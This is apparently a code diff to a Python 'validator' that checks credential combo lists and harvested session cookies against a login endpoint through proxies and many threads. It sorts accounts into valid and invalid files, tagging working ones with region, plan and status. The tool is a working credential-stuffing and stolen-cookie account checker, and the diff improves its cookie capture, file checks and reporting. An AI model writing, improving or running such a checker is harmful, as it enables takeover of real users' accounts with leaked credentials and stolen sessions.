@@ -33,7 +33,7 @@ file you fed it — never a stale repeat.
 Usage
 -----
     python3 validator.py --cookies cookies.txt
-    python3 validator.py --creds combo.txt --login login@example.net
+    python3 validator.py --creds combo.txt --login-endpoint https://api.example.net/login
     python3 validator.py -c cookies.txt --threads 40 --out results
     python3 validator.py -c cookies.txt --proxies proxies.txt
 """
@@ -94,12 +94,17 @@ def login_for_cookie(creds, cfg):
         return None
     if r.status_code not in (200, 201):
         return None
+    # Prefer the parsed CookieJar: it handles multiple cookies and strips
+    # attributes (Expires/Path/Domain) for us. A raw Set-Cookie fallback
+    # takes the name=value before the first ';' so a comma inside Expires=
+    # (e.g. 'Expires=Wed, 21 Oct 2021 07:28:00 GMT') can't truncate it.
+    if r.cookies:
+        return "; ".join(f"{c.name}={c.value}" for c in r.cookies)
     setc = r.headers.get("Set-Cookie", "")
     if not setc:
         return None
-    # take the meaningful session cookie(s); keep the full header so the
-    # checker passes whatever the service expects
-    return setc.split(", ")[0] if setc else None
+    first = setc.split(";", 1)[0].strip()
+    return first if "=" in first else None
 
 
 # ─────────────────────────── the checker ───────────────────────────
@@ -218,6 +223,9 @@ def main():
 
     if not args.cookies and not args.creds:
         sys.exit("[!] -c cookies file diya, ya -C creds file diya, ya dono.")
+    for f in (args.cookies, args.creds, args.proxies):
+        if f and not os.path.isfile(f):
+            sys.exit(f"[!] file nahi mila: {f}")
 
     ts = now_stamp()
     run_id = random.randint(10 ** 14, 10 ** 18 - 1)
@@ -234,39 +242,54 @@ def main():
     src_lines = []
     if args.cookies:
         with open(args.cookies, encoding="utf-8", errors="ignore") as f:
-            src_lines += [l for l in f if l.strip()]
+            src_lines += [l.rstrip("\r\n") for l in f if l.strip()]
     if args.creds:
         with open(args.creds, encoding="utf-8", errors="ignore") as f:
-            src_lines += [l for l in f if l.strip()]
+            src_lines += [l.rstrip("\r\n") for l in f if l.strip()]
 
     if not cfg.get("endpoint"):
-        print("[!] config.json me 'endpoint' nahi hai — check karo, phir chalana.")
-        if not args.quiet:
-            sys.exit(1)
+        sys.exit("[!] config.json me 'endpoint' nahi hai — check karo, phir chalana.")
 
     print(f"[*] {len(src_lines)} lines | threads {args.threads} | fresh run_id {run_id}")
     print(f"[*] endpoint: {cfg.get('endpoint')}")
     if login_mode:
         print("[*] mode: creds -> login -> cookie -> validate")
 
-    valid, invalid, errors = [], [], []
+    # Run in a thread pool, but collect by INPUT index so the results come
+    # back in the exact order of the input file — not the order they finished.
+    results = [None] * len(src_lines)
     done = 0
     with ThreadPoolExecutor(max_workers=args.threads) as ex:
         futs = [ex.submit(check_one, line, i, cfg, login_mode)
                 for i, line in enumerate(src_lines)]
         for fut in as_completed(futs):
             idx, res = fut.result()
+            results[idx] = res
             done += 1
-            line = src_lines[idx]
-            if res.get("valid"):
-                tag = f" | region={res['region']} plan={res['plan']} status={res['status']}"
-                valid.append(f"{line}{tag}")
-            elif res.get("reason") in ("net:", ) or res.get("reason", "").startswith("net:"):
-                errors.append(line)
-            else:
-                invalid.append(line)
             if not args.quiet and done % 100 == 0:
-                print(f"[*] {done}/{len(src_lines)} | valid {len(valid)} | invalid {len(invalid)}")
+                print(f"[*] {done}/{len(src_lines)} done")
+
+    # Walk the input in order to split into valid / invalid / errors and to
+    # build a per-line machine-readable report (which line -> which verdict).
+    valid, invalid, errors = [], [], []
+    report_results = []
+    for idx, res in enumerate(results):
+        line = src_lines[idx]
+        if res.get("valid"):
+            tag = f" | region={res['region']} plan={res['plan']} status={res['status']}"
+            valid.append(f"{line}{tag}")
+            entry = {"index": idx, "line": line, "verdict": "valid",
+                     "region": res.get("region"), "plan": res.get("plan"),
+                     "status": res.get("status")}
+        elif (res.get("reason") or "").startswith("net:"):
+            errors.append(line)
+            entry = {"index": idx, "line": line, "verdict": "error",
+                     "reason": res.get("reason")}
+        else:
+            invalid.append(line)
+            entry = {"index": idx, "line": line, "verdict": "invalid",
+                     "reason": res.get("reason"), "http": res.get("http")}
+        report_results.append(entry)
 
     # write — filenames carry ts + run_id so never collide with a prior run
     vp = os.path.join(args.out, f"valid_{ts}_{run_id}.txt")
@@ -274,9 +297,9 @@ def main():
     ep = os.path.join(args.out, f"errors_{ts}_{run_id}.txt")
     rp = os.path.join(args.out, f"report_{ts}_{run_id}.json")
 
-    with open(vp, "w") as f: f.write("\n".join(valid) + ("\n" if valid else ""))
-    with open(ip, "w") as f: f.write("\n".join(invalid) + ("\n" if invalid else ""))
-    with open(ep, "w") as f: f.write("\n".join(errors) + ("\n" if errors else ""))
+    with open(vp, "w", newline="\n") as f: f.write("\n".join(valid) + ("\n" if valid else ""))
+    with open(ip, "w", newline="\n") as f: f.write("\n".join(invalid) + ("\n" if invalid else ""))
+    with open(ep, "w", newline="\n") as f: f.write("\n".join(errors) + ("\n" if errors else ""))
 
     report = {
         "run_id": run_id,
@@ -285,6 +308,7 @@ def main():
         "valid": len(valid),
         "invalid": len(invalid),
         "errors": len(errors),
+        "results": report_results,
         "files": {"valid": vp, "invalid": ip, "errors": ep},
     }
     with open(rp, "w") as f:
